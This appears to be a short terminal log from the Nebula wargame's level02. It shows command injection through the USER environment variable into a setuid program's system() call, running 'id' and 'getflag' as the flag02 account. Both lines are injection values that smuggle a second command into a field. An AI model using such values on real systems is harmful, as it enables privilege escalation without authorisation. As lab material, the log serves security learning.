```
level02@nebula:/home/flag02$ USER=";id && false" ./flag02
about to call system("/bin/echo ;id && false is cool")

uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)



level02@nebula:/home/flag02$ USER=\;getflag ./flag02
about to call system("/bin/echo ;getflag is cool")

You have successfully executed getflag on a target account
```
